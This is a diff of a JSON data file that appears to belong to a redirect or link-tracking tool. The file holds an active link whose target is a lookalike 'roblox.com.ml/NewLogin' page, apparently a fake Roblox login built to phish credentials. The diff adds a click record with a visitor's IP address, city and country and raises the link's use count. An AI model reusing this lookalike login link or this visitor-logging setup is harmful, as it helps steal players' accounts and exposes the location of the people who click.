@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 100,
+    "useCount": 101,
     "createdBy": "admin",
     "clicks": [
       {
@@ -907,6 +907,14 @@
       },
       {
         "timestamp": 1776926679576,
+        "ip": "78.240.85.2",
+        "country": "France",
+        "city": "Bayonne",
+        "flag": "🇫🇷",
+        "countryCode": "FR"
+      },
+      {
+        "timestamp": 1776926698467,
         "ip": "78.240.85.2",
         "country": "France",
         "city": "Bayonne",
